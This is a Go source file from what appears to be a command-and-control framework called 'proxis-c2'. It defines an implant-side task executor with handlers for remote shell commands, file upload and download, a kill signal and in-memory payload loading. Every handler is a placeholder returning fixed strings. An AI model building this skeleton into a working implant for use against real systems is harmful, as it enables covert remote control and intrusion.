package executor

import (
	"context"
	"log"
	"sync"

	"github.com/proxis-c2/proxis-c2/internal/common/config"
	"github.com/proxis-c2/proxis-c2/internal/common/protocol"
	"github.com/proxis-c2/proxis-c2/internal/agent/memory"
)

// AgentExecutor handles task execution for the agent
type AgentExecutor struct {
	config         *config.AgentConfig
	agentID        string
	memoryExecutor *memory.MemoryExecutor
	mu             sync.Mutex
}

// NewAgentExecutor creates a new agent executor
func NewAgentExecutor(cfg *config.AgentConfig, agentID string) *AgentExecutor {
	return &AgentExecutor{
		config:         cfg,
		agentID:        agentID,
		memoryExecutor: memory.NewMemoryExecutor(),
	}
}

// ExecuteTask executes a task and returns the result
func (e *AgentExecutor) ExecuteTask(ctx context.Context, task *protocol.Task) (*protocol.TaskResult, error) {
	log.Printf("Executing task %s for agent %s", task.TaskId, task.AgentId)

	var output []byte
	var success bool

	switch task.Type {
	case protocol.TaskType_TASK_EXECUTE:
		output, success = e.executeCommand(task.EncryptedData)
	case protocol.TaskType_TASK_UPLOAD:
		output, success = e.handleUpload(task.EncryptedData)
	case protocol.TaskType_TASK_DOWNLOAD:
		output, success = e.handleDownload(task.EncryptedData)
	case protocol.TaskType_TASK_KILL:
		output, success = e.handleKill()
	default:
		return &protocol.TaskResult{
			TaskId:  task.TaskId,
			AgentId: e.agentID,
			Success: false,
		}, nil
	}

	return &protocol.TaskResult{
		TaskId:         task.TaskId,
		AgentId:        e.agentID,
		Success:        success,
		EncryptedOutput: output,
	}, nil
}

// executeCommand executes a shell command
func (e *AgentExecutor) executeCommand(data []byte) ([]byte, bool) {
	// Placeholder for command execution
	// In a real implementation, this would execute the command
	return []byte("command executed"), true
}

// handleUpload handles file upload
func (e *AgentExecutor) handleUpload(data []byte) ([]byte, bool) {
	// Placeholder for file upload handling
	return []byte("upload complete"), true
}

// handleDownload handles file download
func (e *AgentExecutor) handleDownload(data []byte) ([]byte, bool) {
	// Placeholder for file download handling
	return []byte("download complete"), true
}

// handleKill handles kill command
func (e *AgentExecutor) handleKill() ([]byte, bool) {
	// Placeholder for kill handling
	return []byte("kill signal received"), true
}

// RunMemoryExecution executes code in memory
func (e *AgentExecutor) RunMemoryExecution(payload []byte) error {
	e.mu.Lock()
	defer e.mu.Unlock()

	// Allocate memory for the payload
	if err := e.memoryExecutor.AllocateMemory(len(payload)); err != nil {
		return err
	}

	// Write payload to memory
	if err := e.memoryExecutor.WritePayload(0, payload); err != nil {
		return err
	}

	// In a real implementation, this would execute the payload in memory
	// For now, we just return success
	return nil
}

// CleanupMemory cleans up allocated memory
func (e *AgentExecutor) CleanupMemory() error {
	e.mu.Lock()
	defer e.mu.Unlock()
	return e.memoryExecutor.Cleanup()
}